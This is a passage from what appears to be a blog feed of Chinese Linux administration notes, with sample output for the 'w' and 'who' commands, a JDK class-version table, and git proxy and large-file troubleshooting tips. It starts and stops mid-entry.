class="hljs-number">47</span>    <span class="hljs-number">8</span>:<span class="hljs-number">52</span>   <span class="hljs-number">0.00s</span>  <span class="hljs-number">0.00s</span> -bash<br></code></pre></td></tr></table></figure><h4 id="s-精简显示"><a href="#s-精简显示" class="headerlink" title="-s 精简显示"></a>-s 精简显示</h4><p>登录用户名，登录方式，登录来源IP，闲置时间，当前操作</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -s</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">52</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM              IDLE WHAT<br>root     tty1                       <span class="hljs-number">1</span>:<span class="hljs-number">04m</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">4.00s</span> -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">9</span>:<span class="hljs-number">16</span>  -bash<br></code></pre></td></tr></table></figure><h4 id="h-不显示标题字段"><a href="#h-不显示标题字段" class="headerlink" title="-h 不显示标题字段"></a>-h 不显示标题字段</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># w -h</span><br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">06</span>m  <span class="hljs-number">0.10</span>s  <span class="hljs-number">0.10</span>s -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span><span class="hljs-number">.205</span><span class="hljs-number">.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">2.00</span>s  <span class="hljs-number">0.55</span>s  <span class="hljs-number">0.55</span>s -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span><span class="hljs-number">.205</span><span class="hljs-number">.114</span>   <span class="hljs-number">23</span>:<span class="hljs-number">47</span>   <span class="hljs-number">10</span>:<span class="hljs-number">42</span>   <span class="hljs-number">0.00</span>s  <span class="hljs-number">0.00</span>s -bash<br></code></pre></td></tr></table></figure><h4 id="i-显示以主机名登录的"><a href="#i-显示以主机名登录的" class="headerlink" title="-i 显示以主机名登录的"></a>-i 显示以主机名登录的</h4><h4 id="V-显示命令版本"><a href="#V-显示命令版本" class="headerlink" title="-V 显示命令版本"></a>-V 显示命令版本</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w -V<br><span class="hljs-attribute">w</span> from procps-ng <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">17</span><br></code></pre></td></tr></table></figure><h4 id="user-显示指定用户名"><a href="#user-显示指定用户名" class="headerlink" title="user 显示指定用户名"></a>user 显示指定用户名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w root<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">49</span>:<span class="hljs-number">39</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">38</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">4</span>:<span class="hljs-number">08</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>   <span class="hljs-number">27</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">14</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s sh<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">19</span>    <span class="hljs-number">3</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">05</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w root<br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><h3 id="登录信息-var-run-utmp"><a href="#登录信息-var-run-utmp" class="headerlink" title="登录信息 &#x2F;var&#x2F;run&#x2F;utmp"></a>登录信息 &#x2F;var&#x2F;run&#x2F;utmp</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">run</span>]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br>-rw-rw-r-- 1 root utmp 4224 8月  25 09:31 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br></code></pre></td></tr></table></figure><h3 id="进程信息-proc"><a href="#进程信息-proc" class="headerlink" title="进程信息 &#x2F;proc"></a>进程信息 &#x2F;proc</h3><h1 id="who"><a href="#who" class="headerlink" title="who"></a>who</h1><p>显示当前登录用户</p><h2 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><p>登录用户名</p><p>登录方式：pts 远程登录  tty 本地登录</p><p>登录时间及登录来源IP</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>who [OPTION]… [ FILE | ARG1 ARG2 ]</p><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><h4 id="a-–all-显示所有"><a href="#a-–all-显示所有" class="headerlink" title="-a –all 显示所有"></a>-a –all 显示所有</h4><p>等同于  -b -d –login -p -r -t -T -u</p><h4 id="b-–boot-系统最近启动时间"><a href="#b-–boot-系统最近启动时间" class="headerlink" title="-b –boot 系统最近启动时间"></a>-b –boot 系统最近启动时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -b<br>         <span class="hljs-attribute">system</span> boot  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="d-–dead-输出-dead-precess"><a href="#d-–dead-输出-dead-precess" class="headerlink" title="-d –dead 输出 dead precess"></a>-d –dead 输出 dead precess</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@iZbp1191gh7vw52537lyxrZ:/<span class="hljs-comment"># who -d</span><br>         pts<span class="hljs-regexp">/3        2023-08-16 12:14            122616 id=ts/</span><span class="hljs-number">3</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/4        2023-07-11 02:37              5696 id=ts/</span><span class="hljs-number">4</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/5        2023-07-11 03:22              5983 id=ts/</span><span class="hljs-number">5</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="H-–heading-输出字段标题"><a href="#H-–heading-输出字段标题" class="headerlink" title="-H –heading 输出字段标题"></a>-H –heading 输出字段标题</h4><h4 id="–ips-输出登录主机hostname对应的ip"><a href="#–ips-输出登录主机hostname对应的ip" class="headerlink" title="–ips 输出登录主机hostname对应的ip"></a>–ips 输出登录主机hostname对应的ip</h4><p>等同于 –lookup </p><p>规范化存储IP，如果可用，就不存储主机名</p><h4 id="l-–login-输出系统登录进程"><a href="#l-–login-输出系统登录进程" class="headerlink" title="-l –login 输出系统登录进程"></a>-l –login 输出系统登录进程</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -l<br><span class="hljs-attribute">LOGIN</span>    ttyS0        <span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">25</span> <span class="hljs-number">10</span>:<span class="hljs-number">21</span>            <span class="hljs-number">306392</span> id=tyS0<br><span class="hljs-attribute">LOGIN</span>    tty1         <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span>               <span class="hljs-number">821</span> id=tty1<br></code></pre></td></tr></table></figure><h4 id="m-只显示-stdin-关联的用户名和主机名"><a href="#m-只显示-stdin-关联的用户名和主机名" class="headerlink" title="-m  只显示 stdin 关联的用户名和主机名"></a>-m  只显示 stdin 关联的用户名和主机名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -m<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="p-–process-输出初始化衍生的进程"><a href="#p-–process-输出初始化衍生的进程" class="headerlink" title="-p –process 输出初始化衍生的进程"></a>-p –process 输出初始化衍生的进程</h4><h4 id="q-–count-输出当前登录的所有用户名和数量"><a href="#q-–count-输出当前登录的所有用户名和数量" class="headerlink" title="-q –count 输出当前登录的所有用户名和数量"></a>-q –count 输出当前登录的所有用户名和数量</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># who -q</span><br>root root root<br><span class="hljs-comment"># users=3</span><br></code></pre></td></tr></table></figure><h4 id="r-–runlevel-输出当前运行级别"><a href="#r-–runlevel-输出当前运行级别" class="headerlink" title="-r –runlevel 输出当前运行级别"></a>-r –runlevel 输出当前运行级别</h4><p>默认是 5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -r<br>         <span class="hljs-attribute">run</span>-level <span class="hljs-number">5</span>  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="s-–short-只输出用户名，登录方式，时间"><a href="#s-–short-只输出用户名，登录方式，时间" class="headerlink" title="-s –short 只输出用户名，登录方式，时间"></a>-s –short 只输出用户名，登录方式，时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -s<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="t-–time-显示最后一次系统时钟更改"><a href="#t-–time-显示最后一次系统时钟更改" class="headerlink" title="-t –time 显示最后一次系统时钟更改"></a>-t –time 显示最后一次系统时钟更改</h4><h4 id="T-w-–mesg-增加用户消息状态，可能的值"><a href="#T-w-–mesg-增加用户消息状态，可能的值" class="headerlink" title="-T -w –mesg 增加用户消息状态，可能的值 + - ?"></a>-T -w –mesg 增加用户消息状态，可能的值 + - ?</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -T<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="u-–users-用户登录列表"><a href="#u-–users-用户登录列表" class="headerlink" title="-u –users 用户登录列表"></a>-u –users 用户登录列表</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -u<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">09</span>      <span class="hljs-number">572714</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">05</span>      <span class="hljs-number">572786</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>   .        <span class="hljs-number">573045</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h2 id="数据来源-1"><a href="#数据来源-1" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jdk_version</title>
    <link href="/2024/03/15/yunwei/applications/java/jdk_version/"/>
    <url>/2024/03/15/yunwei/applications/java/jdk_version/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">JDK版本</td><td align="center">major.minor version</td><td align="center">十六进制表示</td></tr><tr><td align="center">1.1</td><td align="center">45</td><td align="center">0x2D hex</td></tr><tr><td align="center">1.2</td><td align="center">46</td><td align="center">0x2E hex</td></tr><tr><td align="center">1.3</td><td align="center">47</td><td align="center">0x2F hex</td></tr><tr><td align="center">1.4</td><td align="center">48</td><td align="center">0x30 hex</td></tr><tr><td align="center">1.5</td><td align="center">49</td><td align="center">0x31 hex</td></tr><tr><td align="center">1.6</td><td align="center"><em><strong>50</strong></em></td><td align="center">0x32 hex</td></tr><tr><td align="center">1.7</td><td align="center">51</td><td align="center">0x33 hex</td></tr><tr><td align="center">Java8</td><td align="center">52</td><td align="center">0x34 hex</td></tr><tr><td align="center">Java9</td><td align="center">53</td><td align="center"></td></tr><tr><td align="center">Java10</td><td align="center">54</td><td align="center"></td></tr><tr><td align="center">Java11</td><td align="center">55</td><td align="center"></td></tr><tr><td align="center">Java12</td><td align="center">56</td><td align="center"></td></tr><tr><td align="center">Java13</td><td align="center">57</td><td align="center"></td></tr><tr><td align="center">Java14</td><td align="center">58</td><td align="center"></td></tr><tr><td align="center">Java15</td><td align="center">59</td><td align="center"></td></tr><tr><td align="center">Java16</td><td align="center">60</td><td align="center"></td></tr><tr><td align="center">Java17</td><td align="center">61</td><td align="center"></td></tr><tr><td align="center">Java18</td><td align="center">62</td><td align="center"></td></tr><tr><td align="center">这里只需要记住JDK11的版本号是55,以此为基准上下加减进行即可!</td><td align="center"></td><td align="center"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>jdk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_error/"/>
    <url>/2024/03/15/yunwei/applications/git/git_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对日常使用git过程中遇到的问题及解决方案记录总结</p><h2 id="CentOS-无法-git-clone"><a href="#CentOS-无法-git-clone" class="headerlink" title="CentOS 无法 git clone"></a>CentOS 无法 git clone</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、设置socket5代理</p><p>git config –global http.<a href="https://github.com.proxy/">https://github.com.proxy</a> socks5:&#x2F;&#x2F;10.222.28.7:1081</p><p>2、取消代理</p><p>git config –global –unset http.proxy git config –global –unset https.proxy</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] 设置代理解决github被墙 TjFish 2022-03-15 21:57</p><p>链接：<a href="https://zhuanlan.zhihu.com/p/481574024">https://zhuanlan.zhihu.com/p/481574024</a></p><h2 id="上传文件过大"><a href="#上传文件过大" class="headerlink" title="上传文件过大"></a>上传文件过大</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a><strong>报错信息</strong></h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">➜  studynote git:(main) git push <br>枚举对象中: <span class="hljs-number">834</span>, 完成.<br>对象计数中: <span class="hljs-number">100</span>% (<span class="hljs-number">834</span>/<span class="hljs-number">834</span>), 完成.<br>使用 <span class="hljs-number">8</span> 个线程进行压缩<br>压缩对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">829</span>/<span class="hljs-number">829</span>), 完成.<br>写入对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">831</span>/<span class="hljs-number">831</span>), <span class="hljs-number">467.85</span> MiB | <span class="hljs-number">1.09</span> MiB/s, 完成.<br>总共 <span class="hljs-number">831</span>（差异 <span class="hljs-number">13</span>），复用 <span class="hljs-number">0</span>（差异 <span class="hljs-number">0</span>），包复用 <span class="hljs-number">0</span><br>remote: Resolving deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">13</span>/<span class="hljs-number">13</span>), done.<br>remote: <span class="hljs-literal">error</span>: Trace: b0be7add97db98c12a70ff80495a417f07375427385a833f1e5978a2830b3fb7<br>remote: <span class="hljs-literal">error</span>: See https://gh.io/lfs <span class="hljs-keyword">for</span> more information.<br>remote: <span class="hljs-literal">error</span>: <span class="hljs-keyword">File</span> security/secResources/PPT/FireShot Capture <span class="hljs-number">001</span> - 华为Anti-DDoS方案技术白皮书-V600R21C10 - 华为企业业务 - e.huawei.com.pdf <span class="hljs-keyword">is</span> <span class="hljs-number">309.68</span> MB; this exceeds GitHub<span class="hljs-symbol">&#x27;s</span> <span class="hljs-keyword">file</span> size limit <span class="hljs-keyword">of</span> <span class="hljs-number">100.00</span> MB<br>remote: <span class="hljs-literal">error</span>: GH001: Large files detected. You may want <span class="hljs-keyword">to</span> try Git Large <span class="hljs-keyword">File</span> Storage - https://git-lfs.github.com.<br><span class="hljs-keyword">To</span> ncgithub.com:C0isini/studynote.git<br> ! [remote rejected] main -&gt; main (pre-receive hook declined)<br>错误：无法推送一些引用到 <span class="hljs-symbol">&#x27;ncgithub</span>.com:C0isini/studynote.git&#x27;<br></code></pre></td></tr></table></figure><p>清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_base/"/>
    <url>/2024/03/15/yunwei/applications/git/git_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><h2 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h2><h3 id="git-config-l"><a href="#git-config-l" class="headerlink" title="git config -l"></a>git config -l</h3><p>返回所有配置信息</p><p>返回值为key&#x3D;value格式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">[root@localhost software]<span class="hljs-comment"># git config --global -l</span><br>http.https:<span class="hljs-regexp">//gi</span>thub.com.proxy=socks5:<span class="hljs-regexp">//</span><span class="hljs-number">10.222</span>.<span class="hljs-number">28.7</span>:<span class="hljs-number">1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-get-keyname"><a href="#git-config-get-keyname" class="headerlink" title="git config get keyname"></a>git config get keyname</h3><p>返回指定key的value</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@localhost</span> software]# git config --global --<span class="hljs-keyword">get</span> http.https:<span class="hljs-comment">//github.com.proxy</span><br>socks5:<span class="hljs-comment">//10.222.28.7:1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-–global-–unset-keyname"><a href="#git-config-–global-–unset-keyname" class="headerlink" title="git config –global –unset keyname"></a>git config –global –unset keyname</h3><p>取消指定key的配置</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --unset http.https:<span class="hljs-comment">//github.com.proxy</span></span><br>[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --get http.https:<span class="hljs-comment">//github.com.proxy</span></span><br></code></pre></td></tr></table></figure><h2 id="清除本地缓存"><a href="#清除本地缓存" class="headerlink" title="清除本地缓存"></a>清除本地缓存</h2><p><strong>git rm -r –cached .</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables_command</title>
    <link href="/2024/03/15/yunwei/applications/firewalld/iptables_command/"/>
    <url>/2024/03/15/yunwei/applications/firewalld/iptables_command/</url>
    
